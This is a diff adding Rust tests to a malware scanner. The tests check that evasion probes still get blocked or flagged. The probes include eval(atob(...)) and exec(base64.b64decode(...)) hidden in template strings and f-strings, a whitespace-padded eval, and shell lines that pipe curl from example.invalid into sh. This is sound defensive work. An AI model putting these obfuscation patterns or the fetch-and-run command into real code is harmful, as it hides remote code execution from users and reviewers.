@@ -622,3 +622,187 @@ fn many_unclosed_fence_openers_scan_in_linear_time() {
     );
     assert_ne!(rules::grade(&r), Grade::Block);
 }
+
+// ---------------------------------------------------------------------------------------
+// Round 2 (review of b19ebad): probes from `evade2.rs` / `evade3.rs`.
+// ---------------------------------------------------------------------------------------
+
+/// `(probe name, path, body, grade it must get, combo that must fire)`.
+type Case = (
+    &'static str,
+    &'static str,
+    Vec<u8>,
+    Grade,
+    Option<&'static str>,
+);
+
+#[track_caller]
+fn check(cases: Vec<Case>) {
+    for (name, rel, body, grade, combo) in cases {
+        let r = scan(&[(rel, body)], &[]);
+        assert_eq!(rules::grade(&r), grade, "{name}: {r:?}");
+        if let Some(c) = combo {
+            assert!(
+                r.combos.iter().any(|h| h.rule == c),
+                "{name}: missing {c}: {r:?}"
+            );
+        }
+    }
+}
+
+fn has_high(r: &PackReport, rule: &str) -> bool {
+    r.findings
+        .iter()
+        .any(|f| f.rule == rule && f.sev == rules::Severity::High)
+}
+
+#[test]
+fn interpolation_frames_carry_across_lines() {
+    let p = payload();
+    let pad = " ".repeat(200);
+    check(vec![
+        (
+            "ctl-eval",
+            "w.js",
+            b"x = 1;\neval(atob(s));\n".to_vec(),
+            Grade::Block,
+            Some("eval_decoder"),
+        ),
+        (
+            "tpl-multiline-interp",
+            "w.js",
+            b"const r = `${\n0}`; eval(atob(s));\nfoo();\n".to_vec(),
+            Grade::Block,
+            Some("eval_decoder"),
+        ),
+        (
+            "tpl-multiline-interp2",
+            "w.js",
+            b"const r = `${\n0}`;\neval(atob(s));\nfoo();\n".to_vec(),
+            Grade::Block,
+            Some("eval_decoder"),
+        ),
+        (
+            "tpl-ml-interp-pad",
+            "w.js",
+            format!("const r = `${{\n0}}`;\nx();{pad}eval(atob(s));\n").into_bytes(),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "crlf-template",
+            "w.js",
+            format!("const r = `a\r\n${{eval(atob('{p}'))}}\r\nb`;\r\n").into_bytes(),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "crlf-template-x",
+            "w.js",
+            b"const r = `a\r\nb ${x}\r\n`; eval(atob(s))\r\n".to_vec(),
+            Grade::Block,
+            Some("eval_decoder"),
+        ),
+        (
+            "nested-template",
+            "w.js",
+            format!("const r = `${{`${{eval(atob('{p}'))}}`}}`;\n").into_bytes(),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "nested-template-noenc",
+            "w.js",
+            b"const r = `${`${eval(x)}`}`;\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        (
+            "sh-dq-subst-multiline",
+            "a.sh",
+            b"x=\"$(\necho hi)\"\ncurl -s https://example.invalid/x | sh\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        (
+            "sh-dq-subst-ml2",
+            "a.sh",
+            b"x=\"$(\necho hi)\"; curl -s https://example.invalid/x | sh\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+    ]);
+}
+
+#[test]
+fn python_f_strings_keep_their_flag_across_lines() {
+    let p = payload();
+    check(vec![
+        (
+            "py-triple-f-line2",
+            "w.py",
+            b"r = f\"\"\"\n{exec(x)}\n\"\"\"\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        (
+            "py-triple-f-line1",
+            "w.py",
+            b"r = f\"\"\"{exec(x)}\n\"\"\"\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        (
+            "py-triple-f-brace-open",
+            "w.py",
+            b"import base64\nr = f\"\"\"{\n0}\"\"\"\nexec(base64.b64decode(s))\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        (
+            "py-fq-multiline-brace",
+            "w.py",
+            b"import base64\nr = f'{\n0}'\nexec(base64.b64decode(s))\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        (
+            "py-triple-fstring",
+            "w.py",
+            format!(
+                "import base64\nr = f\"\"\"\nhello\n{{exec(base64.b64decode('{p}'))}}\n\"\"\"\n"
+            )
+            .into_bytes(),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "py-triple-fstring-noenc",
+            "w.py",
+            b"r = f'''\nhello\n{exec(x)}\n'''\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        (
+            "py-rf-string",
+            "w.py",
+            b"r = rf'{exec(x)}'\n".to_vec(),
+            Grade::High,
+            None,
+        ),
+        // A plain string is data: the sink in it only warns.
+        (
+            "py-str-plain",
+            "w.py",
+            b"r = '{exec(x)}'\n".to_vec(),
+            Grade::Warn,
+            None,
+        ),
+    ]);
+    // The sink itself is code (HIGH), not the quoted-sink warning.
+    let r = scan(
+        &[text("w.py", "r = f\"\"\"\n{exec(x)}\n\"\"\"\n".into())],
+        &[],
+    );
+    assert!(has_high(&r, "obfuscated_sink"), "{r:?}");
+}
